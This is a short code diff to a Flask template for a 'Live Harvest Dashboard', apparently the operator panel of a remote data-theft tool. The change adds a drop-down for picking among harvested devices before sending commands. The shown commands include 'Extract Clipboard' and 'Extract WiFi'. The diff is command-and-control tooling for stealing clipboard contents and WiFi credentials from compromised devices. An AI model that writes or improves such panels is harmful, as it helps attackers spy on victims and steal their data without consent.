@@ -11,8 +11,14 @@ harvest_logs = []
 def dashboard():
     return render_template_string('''
         <h2>Live Harvest Dashboard</h2>
-        <h3>REMOTE CONTROL COMMAND</h3>
-<form method="post" action="/command/{{ logs[-1].device if logs else 'Unknown' }}">
+  <h3>REMOTE CONTROL COMMAND</h3>
+<form method="post" action="/command/{{ selected_device }}">
+    <label>Select device:</label>
+    <select name="selected_device">
+      {% for entry in logs|unique(attribute='device') %}
+        <option value="{{ entry.device }}">{{ entry.device }}</option>
+      {% endfor %}
+    </select>
     <select name="cmd">
         <option value="clipboard">Extract Clipboard</option>
         <option value="wifi">Extract WiFi</option>
